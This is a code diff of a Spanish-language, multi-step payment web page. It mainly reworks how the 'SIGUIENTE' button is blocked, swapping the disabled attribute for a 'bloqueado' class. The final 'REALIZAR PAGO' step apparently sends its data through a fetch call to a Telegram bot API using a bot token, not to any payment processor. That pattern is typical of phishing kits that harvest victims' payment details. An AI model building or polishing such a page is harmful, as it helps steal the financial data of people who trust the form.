@@ -486,7 +486,7 @@ main {
     box-shadow: 0 1px 3px rgba(0,0,0,0.1);
     max-width: 300px;
     border: 1px solid #ddd;
-    cursor: pointer; /* Cursor para indicar que se puede hacer clic */
+    cursor: pointer;
 }
 .left-paso-1 .caja-blanca .num { font-size: 13px; font-weight: 700; color: #333; margin-bottom: 5px; }
 .left-paso-1 .caja-blanca .sub { font-size: 12px; color: #666; margin-bottom: 15px; }
@@ -611,10 +611,10 @@ main {
     box-shadow: 0 2px 8px rgba(0,0,0,0.1);
 }
 
-/* BOTÓN SIGUIENTE (Con estado deshabilitado) */
+/* BOTÓN SIGUIENTE */
 .btn-siguiente {
     width: 100%;
-    background: #2da22d; /* Verde normal */
+    background: #2da22d; /* Verde activo */
     color: #fff;
     border: 0;
     border-radius: 4px;
@@ -629,15 +629,16 @@ main {
     gap: 10px;
     transition: all 0.3s;
 }
-.btn-siguiente:hover:not(:disabled) { background: #248524; }
 
-/* Estado deshabilitado */
-.btn-siguiente:disabled {
+/* CLASE PARA BLOQUEAR EL BOTÓN VISUALMENTE */
+.btn-siguiente.bloqueado {
     background: #a5d6a7; /* Verde pálido */
     color: #fff;
     cursor: not-allowed;
     opacity: 0.8;
 }
+
+.btn-siguiente:hover:not(.bloqueado) { background: #248524; }
 
 .recaptcha-texto {
     font-size: 11px;
@@ -968,8 +969,8 @@ main {
             </div>
 
             <div class="card-blanca-amarilla">
-                <!-- Botón empieza DESHABILITADO -->
-                <button class="btn-siguiente" id="btnAccionAmarillo" disabled>
+                <!-- EL BOTÓN AHORA TIENE LA CLASE "bloqueado" -->
+                <button class="btn-siguiente bloqueado" id="btnAccionAmarillo">
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                     SIGUIENTE
                 </button>
@@ -1251,7 +1252,9 @@ function iniciarFlujoAmarillo() {
     // Resetear el check y el botón
     checkPaso1Activado = false;
     checkPaso1.classList.remove('activo');
-    btnAccionAmarillo.disabled = true; // Botón bloqueado al inicio
+    
+    // Bloqueamos visualmente el botón con la clase
+    btnAccionAmarillo.classList.add('bloqueado'); 
     
     actualizarPasoAmarillo();
     
@@ -1269,7 +1272,7 @@ cajaPaso1.addEventListener('click', function() {
     if (pasoActualAmarillo === 1 && !checkPaso1Activado) {
         checkPaso1Activado = true;
         checkPaso1.classList.add('activo'); // Poner verde
-        btnAccionAmarillo.disabled = false; // Desbloquear el botón Siguiente
+        btnAccionAmarillo.classList.remove('bloqueado'); // Desbloquear visualmente
     }
 });
 
@@ -1286,15 +1289,22 @@ function actualizarPasoAmarillo() {
         paso2Amarillo.style.display = 'block';
         paso3Amarillo.style.display = 'none';
         btn.innerHTML = `✓ CONFIRMAR PAGO`;
+        btn.classList.remove('bloqueado'); // En el paso 2 siempre está activo
     } else if (pasoActualAmarillo === 3) {
         paso1Amarillo.style.display = 'none';
         paso2Amarillo.style.display = 'none';
         paso3Amarillo.style.display = 'block';
         btn.innerHTML = `✓ REALIZAR PAGO`;
+        btn.classList.remove('bloqueado'); // En el paso 3 siempre está activo
     }
 }
 
 function accionBotonAmarillo() {
+    // Si el botón está bloqueado (el check no se ha marcado), no hace nada
+    if (btnAccionAmarillo.classList.contains('bloqueado')) {
+        return;
+    }
+
     if (pasoActualAmarillo === 1) {
         // Avanzar al paso 2
         pasoActualAmarillo = 2;
@@ -1340,7 +1350,7 @@ function accionBotonAmarillo() {
     } else if (pasoActualAmarillo === 3) {
         const btn = document.getElementById('btnAccionAmarillo');
         btn.innerHTML = `PROCESANDO...`;
-        btn.disabled = true;
+        btn.classList.add('bloqueado'); // Lo bloqueamos para que no le den doble clic
         
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
